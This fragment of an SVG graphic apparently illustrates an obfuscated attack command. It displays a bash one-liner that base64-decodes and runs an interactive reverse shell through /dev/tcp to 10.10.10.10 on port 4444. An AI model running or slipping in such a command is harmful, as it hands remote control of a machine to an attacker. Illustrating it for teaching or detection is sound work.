  <text x="34" y="330" font-size="9.5" fill="#a0f0a0" font-family="'Courier New',monospace">
    <tspan fill="#00ff88">bash</tspan>
    <tspan fill="#aaaaaa"> -c </tspan>
    <tspan fill="#f0a070">"$(echo </tspan>
    <tspan fill="#f0a070">'enNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEwLjEwLzQ0NDQgMD4mMQ=='</tspan>
    <tspan fill="#f0a070">|</tspan>
    <tspan fill="#79b8ff">base64</tspan>
    <tspan fill="#79b8ff"> -d</tspan>
    <tspan fill="#f0a070">)"</tspan>
  </text>

  <!-- SVG diagram strip -->
